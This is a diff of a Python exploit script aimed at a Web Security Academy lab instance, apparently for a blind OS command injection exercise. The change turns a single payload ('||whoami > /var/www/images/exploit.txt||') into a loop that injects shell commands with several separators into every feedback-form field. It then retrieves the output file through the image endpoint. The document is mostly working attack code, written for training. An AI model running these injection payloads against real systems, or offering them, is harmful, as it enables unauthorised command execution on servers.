@@ -8,7 +8,7 @@ import typer
 console = Console()
 
 
-SERVER="https://0ab7000704c314f3c0ed34680036008e.web-security-academy.net"
+SERVER="https://0ab300830375863cc1695a6000640090.web-security-academy.net"
 ENDPOINT="/feedback/submit"
 
 def injectable_params(server, session):
@@ -19,28 +19,42 @@ def injectable_params(server, session):
     csrf_token = html_document.xpath("//input[@name = 'csrf']/@value")[0]
     console.log(f"CSRF Token = {csrf_token}")
     
+    separators = ["&&", "||", "&", "|", "`"]
+    
+ 
     params = {
     "csrf": csrf_token, 
     "name": 'foo', 
-    "email": '||whoami > /var/www/images/exploit.txt||', 
-    "subject": 'ciccio',
-    "message": 'wewe'
+    "email": 'foo@example.com',
+    "subject": 'sbj',
+    "message": 'this is a test message'
     }
 
-    response=session.post(f"{server}{ENDPOINT}", data=params)
 
-    console.log(f"Post status code {response.status_code}") 
+    for key in params:
+        if key != "csrf":
+            console.rule("[bold red]"+key)
+            tmp = params[key]
+            for sep in separators:
+                console.log("with separator "+sep+" :")
+                injection = sep+'whoami > /var/www/images/exploit_'+key+'.txt'+sep
+                params[key] = injection
+                response=session.post(f"{server}{ENDPOINT}", data=params)
 
-def get_file(server):
-    response=requests.get(f"{server}/image?filename=exploit.txt")
-    console.log(f"Command Get response = {response.text}")
+                console.log(f"Post status code {response.status_code}\n") 
+
+                if response.status_code == 200:
+                    response=requests.get(f"{server}/image?filename=exploit_"+key+".txt")
+                    style = "bold white on yellow"
+                    console.print("Command Get response = "+ response.text, style=style, justify="left")
+
+            params[key] = tmp
     
 
 
 def main(server=SERVER):
     session = requests.Session()
     injectable_params(server, session)
-    get_file(server)
 
 if __name__ == "__main__":
     typer.run(main)
